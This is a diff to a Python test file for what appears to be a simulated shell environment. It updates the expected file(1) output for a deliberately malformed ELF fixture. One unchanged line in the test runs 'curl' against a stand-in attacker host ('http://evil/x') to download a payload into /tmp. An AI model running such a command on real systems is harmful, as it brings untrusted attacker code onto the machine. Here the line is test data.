@@ -129,9 +129,16 @@ def t_the_bytes_read_back_are_the_payload():
     out(s, "curl -sSL http://evil/x -o /tmp/p")
     eq("first bytes", out(s, "head -c 4 /tmp/p | od -An -tx1").split(),
        ["7f", "45", "4c", "46"])
+    # The whole string, not its first field. This expected "pie
+    # executable" because `file` used to answer every ELF with one canned
+    # string; the fixture above is a deliberately rough header -- e_type
+    # is ET_EXEC and the filler lands in e_phnum, making it 2827 -- and
+    # real file(1) 5.46 refuses to walk that many program headers. Handed
+    # exactly these bytes on the guest it says:
     eq("file identifies it",
-       out(s, "file /tmp/p").split(":", 1)[1].strip().split(",")[0],
-       "ELF 64-bit LSB pie executable")
+       out(s, "file /tmp/p").split(":", 1)[1].strip(),
+       "ELF 64-bit LSB executable, x86-64, version 1 (SYSV), "
+       "too many program (2827)")
 
 
 def t_no_zero_padding_in_the_middle():
